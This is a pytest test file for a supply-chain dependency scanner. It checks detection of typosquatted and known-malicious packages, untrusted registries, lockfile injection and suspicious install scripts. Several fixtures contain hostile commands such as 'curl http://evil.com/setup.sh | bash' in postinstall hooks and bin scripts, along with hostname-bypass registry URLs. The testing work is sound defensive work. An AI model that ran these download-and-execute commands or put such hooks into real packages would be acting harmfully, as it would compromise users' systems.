"""Tests for scan_dependencies.py - Dependency Scanner."""

import json
import pytest
import scan_dependencies as scanner


class TestTyposquatting:
    def test_detects_npm_typosquat(self):
        typos = scanner.check_typosquatting(["reacct", "expresss"], scanner.POPULAR_NPM)
        assert len(typos) > 0
        suspects = [t[0] for t in typos]
        assert "reacct" in suspects or "expresss" in suspects

    def test_legitimate_packages_pass(self):
        typos = scanner.check_typosquatting(["react", "express", "lodash"], scanner.POPULAR_NPM)
        assert len(typos) == 0

    def test_l33t_normalization(self):
        assert scanner._apply_l33t("r3act") == "react"
        assert scanner._apply_l33t("l0d@sh") == "lodash"


class TestKnownIOC:
    def test_detects_sandworm_packages(self, repo_with_malicious_deps):
        findings = scanner.scan_package_json(
            str(repo_with_malicious_deps / "package.json"),
            "package.json"
        )
        ioc_findings = [f for f in findings if f.category == "known-ioc"]
        assert len(ioc_findings) > 0
        assert any("claud-code" in f.title for f in ioc_findings)


class TestVersionAnomaly:
    def test_detects_high_version(self):
        assert scanner.check_version_anomaly("99.0.0") is True
        assert scanner.check_version_anomaly("^99.1.0") is True

    def test_normal_versions_pass(self):
        assert scanner.check_version_anomaly("^18.0.0") is False
        assert scanner.check_version_anomaly("~4.17.21") is False
        assert scanner.check_version_anomaly("1.0.0") is False


class TestPackageJsonScan:
    def test_full_scan(self, repo_with_malicious_deps):
        findings = scanner.scan_package_json(
            str(repo_with_malicious_deps / "package.json"),
            "package.json"
        )
        assert len(findings) > 0
        categories = {f.category for f in findings}
        assert "known-ioc" in categories or "typosquatting" in categories

    def test_handles_malformed_json(self, tmp_path):
        bad = tmp_path / "package.json"
        bad.write_text("not valid json{{{")
        findings = scanner.scan_package_json(str(bad), "package.json")
        # Should not crash, should report parse error
        assert any(f.category == "parse-error" for f in findings)


class TestPythonDeps:
    def test_detects_pypi_typosquat(self, tmp_path):
        req = tmp_path / "requirements.txt"
        req.write_text("reqeusts==2.28.0\nnumpy==1.24.0\n")
        findings = scanner.scan_python_deps(str(req), "requirements.txt")
        typos = [f for f in findings if f.category == "typosquatting"]
        assert len(typos) > 0

    def test_detects_pypi_ioc(self, tmp_path):
        req = tmp_path / "requirements.txt"
        req.write_text("anthopic==1.0.0\n")
        findings = scanner.scan_python_deps(str(req), "requirements.txt")
        assert any(f.category == "known-ioc" for f in findings)


class TestLockfile:
    def test_detects_untrusted_registry(self, tmp_path):
        lock = tmp_path / "package-lock.json"
        lock.write_text(json.dumps({
            "packages": {
                "evil-pkg": {
                    "resolved": "https://evil-registry.com/evil-pkg-1.0.0.tgz"
                }
            }
        }))
        findings = scanner.scan_lockfile(str(lock), "package-lock.json")
        assert any("untrusted" in f.title.lower() for f in findings)

    def test_trusted_registries_pass(self, tmp_path):
        lock = tmp_path / "package-lock.json"
        lock.write_text(json.dumps({
            "packages": {
                "react": {
                    "resolved": "https://registry.npmjs.org/react/-/react-18.0.0.tgz"
                }
            }
        }))
        findings = scanner.scan_lockfile(str(lock), "package-lock.json")
        assert len(findings) == 0

    def test_hostname_bypass_evil_subdomain(self, tmp_path):
        """Evil subdomain like evil-registry.npmjs.org.attacker.com must be flagged."""
        lock = tmp_path / "package-lock.json"
        lock.write_text(json.dumps({
            "packages": {
                "evil-pkg": {
                    "resolved": "https://evil-registry.npmjs.org.attacker.com/pkg.tgz"
                }
            }
        }))
        findings = scanner.scan_lockfile(str(lock), "package-lock.json")
        assert any("untrusted" in f.title.lower() for f in findings), \
            "Hostname substring bypass: evil-registry.npmjs.org.attacker.com should be flagged"

    def test_hostname_bypass_path_trick(self, tmp_path):
        """evil.com/registry.npmjs.org/ should be flagged (path-based bypass)."""
        lock = tmp_path / "package-lock.json"
        lock.write_text(json.dumps({
            "packages": {
                "evil-pkg": {
                    "resolved": "https://evil.com/registry.npmjs.org/pkg.tgz"
                }
            }
        }))
        findings = scanner.scan_lockfile(str(lock), "package-lock.json")
        assert any("untrusted" in f.title.lower() for f in findings)

    def test_git_dependency_flagged(self, tmp_path):
        """git+ dependencies should be flagged as HIGH."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "dependencies": {
                "private-lib": "git+https://github.com/org/repo.git"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        assert any(f.category == "git-dependency" for f in findings)

    def test_http_dependency_flagged_critical(self, tmp_path):
        """http:// dependencies should be flagged as CRITICAL."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "dependencies": {
                "unsafe-lib": "http://example.com/lib.tgz"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        assert any(f.severity == "critical" and f.category == "insecure-protocol" for f in findings)

    def test_file_dependency_flagged(self, tmp_path):
        """file: dependencies should be flagged as MEDIUM."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "dependencies": {
                "local-lib": "file:../lib"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        assert any(f.category == "local-dependency" for f in findings)


class TestMissingLockfile:
    def test_no_lockfile_flagged(self, tmp_path):
        """package.json with deps but no lockfile should be flagged."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "dependencies": {"react": "^18.0.0"}
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        assert any(f.category == "missing-lockfile" for f in findings)

    def test_lockfile_present_no_flag(self, tmp_path):
        """package.json with a sibling lockfile should NOT be flagged."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "dependencies": {"react": "^18.0.0"}
        }))
        lock = tmp_path / "package-lock.json"
        lock.write_text("{}")
        findings = scanner.scan_package_json(str(pkg), "package.json")
        assert not any(f.category == "missing-lockfile" for f in findings)

    def test_monorepo_parent_lockfile_ok(self, tmp_path):
        """Monorepo: lockfile in parent dir should suppress the finding."""
        sub = tmp_path / "packages" / "sub"
        sub.mkdir(parents=True)
        pkg = sub / "package.json"
        pkg.write_text(json.dumps({
            "name": "sub",
            "dependencies": {"lodash": "^4.0.0"}
        }))
        # Parent lockfile
        lock = tmp_path / "package-lock.json"
        lock.write_text("{}")
        findings = scanner.scan_package_json(str(pkg), "packages/sub/package.json")
        assert not any(f.category == "missing-lockfile" for f in findings)


class TestPythonUnboundedRanges:
    def test_unbounded_gte_flagged(self, tmp_path):
        """>=X.Y.Z with no upper bound should be flagged as MEDIUM."""
        req = tmp_path / "requirements.txt"
        req.write_text("requests>=2.28.0\n")
        findings = scanner.scan_python_deps(str(req), "requirements.txt")
        assert any(f.category == "unbounded-range" for f in findings)

    def test_compatible_release_not_flagged(self, tmp_path):
        """~=X.Y.Z (compatible release) should NOT be flagged."""
        req = tmp_path / "requirements.txt"
        req.write_text("requests~=2.28.0\n")
        findings = scanner.scan_python_deps(str(req), "requirements.txt")
        assert not any(f.category == "unbounded-range" for f in findings)

    def test_pinned_not_flagged(self, tmp_path):
        """==X.Y.Z should NOT be flagged."""
        req = tmp_path / "requirements.txt"
        req.write_text("requests==2.28.0\n")
        findings = scanner.scan_python_deps(str(req), "requirements.txt")
        assert not any(f.category == "unbounded-range" for f in findings)

    def test_bare_package_flagged(self, tmp_path):
        """Bare package name with no version should be flagged HIGH."""
        req = tmp_path / "requirements.txt"
        req.write_text("requests\n")
        findings = scanner.scan_python_deps(str(req), "requirements.txt")
        assert any(f.category == "no-version-constraint" for f in findings)


class TestFundingUrlFalsePositives:
    def test_opencollective_not_flagged(self, tmp_path):
        """opencollective.com URLs in lockfiles should NOT be flagged."""
        lock = tmp_path / "package-lock.json"
        lock.write_text(json.dumps({
            "packages": {
                "express": {
                    "resolved": "https://registry.npmjs.org/express/-/express-4.18.0.tgz",
                    "funding": "https://opencollective.com/express"
                }
            }
        }))
        findings = scanner.scan_lockfile(str(lock), "package-lock.json")
        assert not any("opencollective" in f.snippet for f in findings)

    def test_tidelift_not_flagged(self, tmp_path):
        """tidelift.com URLs in lockfiles should NOT be flagged."""
        lock = tmp_path / "package-lock.json"
        lock.write_text(json.dumps({
            "packages": {
                "pkg": {
                    "resolved": "https://registry.npmjs.org/pkg/-/pkg-1.0.0.tgz",
                    "funding": "https://tidelift.com/funding/github/npm/pkg"
                }
            }
        }))
        findings = scanner.scan_lockfile(str(lock), "package-lock.json")
        assert not any("tidelift" in f.snippet for f in findings)


class TestManifestConfusion:
    """Tests for manifest confusion detection (Item 2)."""

    def test_script_references_missing_file(self, tmp_path):
        """Script referencing a non-existent file should flag."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "postinstall": "node ./setup.js"
            },
            "dependencies": {}
        }))
        findings = scanner.scan_manifest_confusion(str(pkg), "package.json")
        assert any(f.category == "manifest-confusion" for f in findings)

    def test_script_references_existing_file_ok(self, tmp_path):
        """Script referencing an existing file should not flag."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "build": "node ./build.js"
            },
            "dependencies": {}
        }))
        (tmp_path / "build.js").write_text("console.log('building')")
        findings = scanner.scan_manifest_confusion(str(pkg), "package.json")
        script_findings = [f for f in findings if "missing file" in f.title]
        assert len(script_findings) == 0

    def test_main_points_to_high_entropy_file(self, tmp_path):
        """main field pointing to high-entropy file should flag."""
        import random
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "main": "./index.js",
            "dependencies": {}
        }))
        # Create high-entropy file using all printable ASCII chars (wide charset = higher entropy)
        charset = ''.join(chr(i) for i in range(33, 127))  # 94 printable chars
        random.seed(42)
        random_content = ''.join(random.choice(charset) for _ in range(2000))
        (tmp_path / "index.js").write_text(random_content)
        findings = scanner.scan_manifest_confusion(str(pkg), "package.json")
        entropy_findings = [f for f in findings if "entropy" in f.title]
        assert len(entropy_findings) > 0

    def test_bin_with_suspicious_curl_pipe_bash(self, tmp_path):
        """Bin entry with curl piped to bash should flag."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "bin": {"cli": "./cli.sh"},
            "dependencies": {}
        }))
        (tmp_path / "cli.sh").write_text("#!/bin/bash\ncurl http://evil.com/payload | bash\n")
        findings = scanner.scan_manifest_confusion(str(pkg), "package.json")
        bin_findings = [f for f in findings if "bin" in f.title.lower()]
        assert len(bin_findings) > 0
        assert any(f.severity == "high" for f in bin_findings)

    def test_invalid_json_skips_gracefully(self, tmp_path):
        """Invalid JSON should not crash."""
        pkg = tmp_path / "package.json"
        pkg.write_text("not json{{{")
        findings = scanner.scan_manifest_confusion(str(pkg), "package.json")
        assert len(findings) == 0


class TestLockfileInjection:
    """Tests for lockfile injection detection (Item 3)."""

    def test_pnpm_http_tarball(self, tmp_path):
        """HTTP tarballs in pnpm-lock.yaml should flag."""
        lock = tmp_path / "pnpm-lock.yaml"
        lock.write_text(
            "lockfileVersion: '9.0'\n"
            "packages:\n"
            "  lodash@4.17.21:\n"
            "    resolution: {tarball: http://evil.com/lodash-4.17.21.tgz}\n"
        )
        findings = scanner.scan_lockfile_injection(str(lock), "pnpm-lock.yaml")
        assert any(f.category == "lockfile-injection" for f in findings)
        assert any(f.severity == "high" for f in findings)

    def test_package_lock_missing_integrity(self, tmp_path):
        """package-lock.json entry missing integrity should flag."""
        lock = tmp_path / "package-lock.json"
        lock.write_text(json.dumps({
            "lockfileVersion": 3,
            "packages": {
                "node_modules/evil-pkg": {
                    "version": "1.0.0",
                    "resolved": "https://registry.npmjs.org/evil-pkg/-/evil-pkg-1.0.0.tgz"
                }
            }
        }))
        findings = scanner.scan_lockfile_injection(str(lock), "package-lock.json")
        assert any(f.category == "lockfile-injection" for f in findings)
        assert any("integrity" in f.title.lower() for f in findings)

    def test_package_lock_with_integrity_ok(self, tmp_path):
        """package-lock.json entry WITH integrity should not flag."""
        lock = tmp_path / "package-lock.json"
        lock.write_text(json.dumps({
            "lockfileVersion": 3,
            "packages": {
                "node_modules/safe-pkg": {
                    "version": "1.0.0",
                    "resolved": "https://registry.npmjs.org/safe-pkg/-/safe-pkg-1.0.0.tgz",
                    "integrity": "sha512-abc123..."
                }
            }
        }))
        findings = scanner.scan_lockfile_injection(str(lock), "package-lock.json")
        integrity_findings = [f for f in findings if "integrity" in f.title.lower()]
        assert len(integrity_findings) == 0

    def test_yarn_lock_non_registry_url(self, tmp_path):
        """yarn.lock resolved to non-registry domain should flag."""
        lock = tmp_path / "yarn.lock"
        lock.write_text(
            '# yarn lockfile v1\n\n'
            '"lodash@^4.17.0":\n'
            '  version "4.17.21"\n'
            '  resolved "https://evil-registry.com/lodash-4.17.21.tgz"\n'
            '  integrity sha512-abc...\n'
        )
        findings = scanner.scan_lockfile_injection(str(lock), "yarn.lock")
        assert any(f.category == "lockfile-injection" for f in findings)
        assert any("evil-registry.com" in f.description for f in findings)

    def test_yarn_lock_registry_ok(self, tmp_path):
        """yarn.lock resolved to standard registry should not flag."""
        lock = tmp_path / "yarn.lock"
        lock.write_text(
            '# yarn lockfile v1\n\n'
            '"lodash@^4.17.0":\n'
            '  version "4.17.21"\n'
            '  resolved "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz"\n'
            '  integrity sha512-abc...\n'
        )
        findings = scanner.scan_lockfile_injection(str(lock), "yarn.lock")
        assert len(findings) == 0


class TestBehavioralSignals:
    """Tests for behavioral scoring signals (Item 7)."""

    def test_network_plus_fs_write_in_install(self, tmp_path):
        """Install script with both network and fs write patterns should flag."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "postinstall": "curl http://evil.com/config > /tmp/config && cp /tmp/config ./node_modules/.cache"
            },
            "dependencies": {}
        }))
        findings = scanner.scan_behavioral_signals(str(pkg), "package.json")
        assert any(f.category == "behavioral-signal" for f in findings)

    def test_obfuscated_install_script(self, tmp_path):
        """High-entropy install script should flag as obfuscated."""
        import random
        random.seed(42)
        obfuscated = ''.join(random.choice(
            'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()[]{}|;:,.<>?/~`'
        ) for _ in range(200))
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "postinstall": obfuscated
            },
            "dependencies": {}
        }))
        findings = scanner.scan_behavioral_signals(str(pkg), "package.json")
        assert any("obfuscated" in f.title for f in findings)

    def test_postinstall_download_and_exec(self, tmp_path):
        """postinstall that downloads and executes should flag."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "postinstall": "curl -s http://evil.com/setup.sh | bash"
            },
            "dependencies": {}
        }))
        findings = scanner.scan_behavioral_signals(str(pkg), "package.json")
        assert any("downloads and executes" in f.title for f in findings)

    def test_clean_scripts_not_flagged(self, tmp_path):
        """Normal build scripts should not flag behavioral signals."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "build": "tsc",
                "test": "jest",
                "prepare": "husky install"
            },
            "dependencies": {}
        }))
        findings = scanner.scan_behavioral_signals(str(pkg), "package.json")
        assert len(findings) == 0

    def test_no_install_scripts_not_flagged(self, tmp_path):
        """Package without install scripts should not flag."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "start": "node index.js"
            },
            "dependencies": {}
        }))
        findings = scanner.scan_behavioral_signals(str(pkg), "package.json")
        assert len(findings) == 0
